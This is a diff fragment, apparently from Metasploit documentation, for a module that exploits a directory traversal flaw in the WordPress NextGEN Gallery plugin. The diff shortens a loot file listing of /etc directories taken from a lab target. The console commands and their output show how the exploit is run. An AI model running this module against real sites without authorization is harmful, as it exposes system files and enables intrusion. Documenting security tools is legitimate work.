@@ -88,7 +88,17 @@ msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  run
 msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  head /home/espreto/.msf4/loot/20150901235949_default_192.168.1.63_nextgen.traversa_297638.txt
 [*] exec: head /home/espreto/.msf4/loot/20150901235949_default_192.168.1.63_nextgen.traversa_297638.txt
 
-["/etc/.java", "/etc/acpi", "/etc/alternatives", "/etc/apache2", "/etc/apm", "/etc/apparmor", "/etc/apparmor.d", "/etc/apport", "/etc/apt", "/etc/at-spi2", "/etc/avahi", "/etc/bash_completion.d", "/etc/bluetooth", "/etc/bonobo-activation", "/etc/brltty", "/etc/ca-certificates", "/etc/calendar", "/etc/chatscripts", "/etc/checkbox.d", "/etc/compizconfig", "/etc/console-setup", "/etc/ConsoleKit", "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.monthly", "/etc/cron.weekly", "/etc/cups", "/etc/cupshelpers", "/etc/dbconfig-common", "/etc/dbus-1", "/etc/default", "/etc/depmod.d", "/etc/dhcp", "/etc/dictionaries-common", "/etc/dkms", "/etc/doc-base", "/etc/dpkg", "/etc/elasticsearch", "/etc/emacs", "/etc/firefox", "/etc/fonts", "/etc/foomatic", "/etc/fstab.d", "/etc/gconf", "/etc/gdb", "/etc/ghostscript", "/etc/ginn", "/etc/gnome", "/etc/gnome-app-install", "/etc/gnome-settings-daemon", "/etc/gnome-vfs-2.0", "/etc/goahead", "/etc/groff", "/etc/grub.d", "/etc/gtk-2.0", "/etc/gtk-3.0", "/etc/hp", "/etc/ifplugd", "/etc/init", "/etc/init.d", "/etc/initramfs-tools", "/etc/insserv", "/etc/insserv.conf.d", "/etc/iproute2", "/etc/java-7-openjdk", "/etc/kbd", "/etc/kernel", "/etc/ld.so.conf.d", "/etc/ldap", "/etc/libnl-3", "/etc/libpaper.d", "/etc/libreoffice", "/etc/lightdm", "/etc/logcheck", "/etc/logrotate.d", "/etc/logstash", "/etc/lsb-base", "/etc/modprobe.d", "/etc/mysql", "/etc/network", "/etc/NetworkManager", "/etc/newt", "/etc/obex-data-server", "/etc/opt", "/etc/pam.d", "/etc/pcmcia", "/etc/pear", "/etc/perl", "/etc/php5", "/etc/pkcs11", "/etc/pm", "/etc/polkit-1", "/etc/postgresql", "/etc/postgresql-common", "/etc/ppp", "/etc/profile.d", "/etc/pulse", "/etc/python", "/etc/python2.7", "/etc/rc0.d", "/etc/rc1.d", "/etc/rc2.d", "/etc/rc3.d", "/etc/rc4.d", "/etc/rc5.d", "/etc/rc6.d", "/etc/rcS.d", "/etc/resolvconf", "/etc/rsyslog.d", "/etc/sane.d", "/etc/security", "/etc/sensors.d", "/etc/sgml", "/etc/skel", "/etc/snmp", "/etc/sound", "/etc/speech-dispatcher", "/etc/ssh", "/etc/ssl", "/etc/sudoers.d", "/etc/sysctl.d", "/etc/systemd", "/etc/terminfo", "/etc/thunderbird", "/etc/udev", "/etc/ufw", "/etc/update-manager", "/etc/update-motd.d", "/etc/update-notifier", "/etc/UPower", "/etc/usb_modeswitch.d", "/etc/vim", "/etc/wireshark", "/etc/wpa_supplicant", "/etc/X11", "/etc/xdg", "/etc/xml", "/etc/xul-ext"]msfdevel 192.168.1.55 shell[s]:0 job[s]:0 msf> auxiliary(wp_nextgen_galley_file_read)  set VERBOSE true
+/etc/.java
+/etc/acpi
+/etc/alternatives
+/etc/apache2
+/etc/apm
+/etc/apparmor
+/etc/apparmor.d
+/etc/apport
+/etc/apt
+/etc/at-spi2
+msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  set VERBOSE true
 VERBOSE => true
 msfdevel msf> auxiliary(wp_nextgen_galley_file_read)  run
 
